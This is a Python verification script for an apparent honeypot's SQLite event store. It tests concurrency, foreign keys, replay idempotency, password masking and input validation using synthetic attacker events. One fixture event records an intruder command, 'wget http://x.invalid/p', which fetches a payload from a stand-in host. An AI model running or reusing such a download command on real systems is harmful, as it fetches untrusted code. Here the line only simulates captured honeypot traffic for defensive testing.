"""Deep verification of the runtime properties the unit tests don't cover."""
import sqlite3, sys, threading, time, uuid, json
from datetime import datetime, timezone, timedelta
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))

from db.database import Database
from db.validation import validate_event

DB = Path("verify.db")
for p in Path(".").glob("verify.db*"): p.unlink()

db = Database(path=DB)
db.initialize_schema()

def ts(off=0):
    return (datetime.now(timezone.utc) - timedelta(seconds=off)).strftime("%Y-%m-%dT%H:%M:%SZ")

def ev(**kw):
    e = {"event_id": str(uuid.uuid4()), "node_id": "node-01", "event_type": "login_attempt",
         "timestamp": ts(), "session_id": "node-01:v1", "attacker_ip": "203.0.113.10",
         "protocol": "ssh", "details": {"username": "root", "password": "s3cret"}}
    e.update(kw); return e

ok = lambda c: "PASS" if c else "**FAIL**"
results = []
def check(label, cond, note=""):
    results.append(cond)
    print(f"  [{ok(cond)}] {label}" + (f"  ({note})" if note else ""))

print("===== 2. PRAGMAS & CONCURRENCY CONFIGURATION =====")
jm = db.conn.execute("PRAGMA journal_mode").fetchone()[0]
check("WAL journal mode active", jm == "wal", f"journal_mode={jm}")
bt = db.conn.execute("PRAGMA busy_timeout").fetchone()[0]
check("busy_timeout set", bt == 5000, f"{bt}ms")
fk = db.conn.execute("PRAGMA foreign_keys").fetchone()[0]
check("foreign_keys enforced", fk == 1)
uv = db.current_user_version()
check("schema user_version stamped", uv == 13, f"user_version={uv} (=v1.3)")

print("\n===== 3. FOREIGN KEY BEHAVIOUR =====")
db.apply_event(ev())
check("apply_event auto-creates the parent node row",
      db.query_one("SELECT COUNT(*) c FROM nodes WHERE node_id='node-01'")["c"] == 1)
try:
    with db.transaction() as c:
        c.execute("INSERT INTO events (event_id,node_id,session_id,event_type,timestamp,"
                  "attacker_ip,protocol,details,received_at) VALUES (?,?,?,?,?,?,?,?,?)",
                  (str(uuid.uuid4()), "node-99", None, "heartbeat", ts(), None, None, "{}", ts()))
    check("raw insert for unknown node is rejected by FK", False)
except Exception as e:
    check("raw insert for unknown node is rejected by FK", "FOREIGN KEY" in str(e).upper(),
          type(e).__name__)

print("\n===== 4. CONCURRENT WRITERS (the SQLite-locking risk) =====")
errors, counts = [], {}
def collector(tid, n=120):
    d = Database(path=DB)                      # own handle, like a separate process
    good = 0
    try:
        for i in range(n):
            d.apply_event(ev(session_id=f"node-01:t{tid}", attacker_ip=f"203.0.113.{tid+1}",
                             timestamp=ts(n - i)))
            good += 1
    except Exception as e:
        errors.append(f"thread{tid}: {type(e).__name__}: {e}")
    finally:
        counts[tid] = good; d.close()

threads = [threading.Thread(target=collector, args=(i,)) for i in range(6)]
t0 = time.time()
for t in threads: t.start()
for t in threads: t.join()
elapsed = time.time() - t0
total = db.query_one("SELECT COUNT(*) c FROM events")["c"]
check("6 concurrent writers, 720 events, zero errors", not errors, "; ".join(errors[:2]))
check("all 720 events landed", total == 721, f"{total} rows incl. the earlier one")
print(f"        {720/elapsed:,.0f} events/sec across 6 threads ({elapsed:.2f}s)")

print("\n===== 5. READER NEVER BLOCKS THE WRITER =====")
reader = Database(path=DB, read_only=True)
stop = threading.Event(); reads = [0]; read_err = []
def poll():
    r = Database(path=DB, read_only=True)
    try:
        while not stop.is_set():
            r.query("SELECT COUNT(*) FROM events"); r.query("SELECT * FROM sessions_public LIMIT 50")
            reads[0] += 1; time.sleep(0.001)
    except Exception as e: read_err.append(str(e))
    finally: r.close()
p = threading.Thread(target=poll); p.start()
w = threading.Thread(target=collector, args=(99, 200)); w.start(); w.join()
stop.set(); p.join()
check("dashboard polled continuously during a write burst", not read_err, f"{reads[0]} reads")
try:
    with reader.transaction(): pass
    check("read-only handle cannot open a write transaction", False)
except Exception as e:
    check("read-only handle cannot open a write transaction", True, type(e).__name__)
reader.close()

print("\n===== 6. IDEMPOTENCY UNDER REPLAY =====")
batch = [ev(timestamp=ts(50 - i), session_id="node-01:replay") for i in range(20)]
r1 = db.apply_events(batch)
r2 = db.apply_events(batch)                    # a node re-draining pending_events.jsonl
r3 = db.apply_events(batch)
check("first delivery accepted", r1["accepted"] == 20 and r1["duplicates"] == 0, str(r1["accepted"]))
check("replay is 100% duplicates, 0 accepted",
      r2["duplicates"] == 20 and r2["accepted"] == 0 and r3["duplicates"] == 20)

print("\n===== 7. OUT-OF-ORDER ARRIVAL =====")
s = "node-01:ooo"
db.apply_event(ev(event_type="session_end", session_id=s, timestamp=ts(0),
                  details={"status": "closed", "duration_seconds": 42}))
db.apply_event(ev(event_type="command", session_id=s, timestamp=ts(20),
                  details={"command": "wget http://x.invalid/p"}))
db.apply_event(ev(event_type="connection", session_id=s, timestamp=ts(60),
                  details={"destination_port": 22}))
row = db.query_one("SELECT * FROM sessions WHERE session_id=?", (s,))
check("late connection did not reopen a closed session", row["status"] == "closed", row["status"])
check("start_time is the earliest, end_time the latest",
      row["start_time"] < row["end_time"], f"{row['start_time']} -> {row['end_time']}")

print("\n===== 8. MASKING GUARANTEE =====")
raw = db.query_one("SELECT password FROM sessions WHERE password IS NOT NULL LIMIT 1")
check("plaintext retained locally in sessions", raw["password"] == "s3cret")
pub = db.query_one("SELECT password FROM sessions_public WHERE password IS NOT NULL LIMIT 1")
check("sessions_public view masks it", pub["password"] == "***MASKED***", pub["password"])
check("get_sessions() helper is masked",
      all(r["password"] in (None, "***MASKED***") for r in db.get_sessions(limit=500)))

print("\n===== 9. INDEXES ARE ACTUALLY USED =====")
plans = {
  "events by attacker_ip": "SELECT * FROM events WHERE attacker_ip='203.0.113.10'",
  "events by type+time":   "SELECT * FROM events WHERE event_type='command' AND timestamp>='2020-01-01T00:00:00Z'",
  "open alerts":           "SELECT * FROM alerts WHERE status='open' ORDER BY timestamp DESC",
  "session commands":      "SELECT * FROM events WHERE session_id='node-01:ooo'",
}
for label, sql in plans.items():
    plan = " ".join(r["detail"] for r in db.query("EXPLAIN QUERY PLAN " + sql))
    check(f"{label}", "USING INDEX" in plan.upper() or "USING COVERING INDEX" in plan.upper(),
          plan[:70])

print("\n===== 10. VALIDATOR REJECTS EVERY CONTRACT VIOLATION =====")
bad = {
 "omitted field":        (lambda e: (e.pop("protocol"), e)[1]),
 "null on non-heartbeat":(lambda e: {**e, "attacker_ip": None}),
 "non-null heartbeat":   (lambda e: {**e, "event_type":"heartbeat","session_id":None,
                                     "protocol":None,"details":{"status":"online"}}),
 "unknown event_type":   (lambda e: {**e, "event_type":"port_scan"}),
 "bad uuid":             (lambda e: {**e, "event_id":"xyz"}),
 "bad timestamp":        (lambda e: {**e, "timestamp":"2026-07-19 15:00:00"}),
 "details null":         (lambda e: {**e, "details": None}),
 "details not object":   (lambda e: {**e, "details": "root"}),
 "disallowed detail key":(lambda e: {**e, "details":{"username":"r","shell":"/bin/sh"}}),
 "missing required key": (lambda e: {**e, "event_type":"command","details":{}}),
 "extra top-level key":  (lambda e: {**e, "username":"root"}),
 "bad protocol":         (lambda e: {**e, "protocol":"http"}),
 "unknown node":         (lambda e: {**e, "node_id":"node-42"}),
}
for label, mutate in bad.items():
    e = mutate(ev())
    if label == "non-null heartbeat": e["attacker_ip"] = "203.0.113.10"
    valid, errs = validate_event(e)
    check(f"rejects {label}", not valid, (errs[0][:60] if errs else "ACCEPTED!"))
check("accepts a well-formed event", validate_event(ev())[0])

print("\n" + "=" * 60)
print(f"{sum(results)}/{len(results)} checks passed"
      + ("" if all(results) else "  <-- FAILURES PRESENT"))
db.close()
for p in Path(".").glob("verify.db*"): p.unlink()
sys.exit(0 if all(results) else 1)
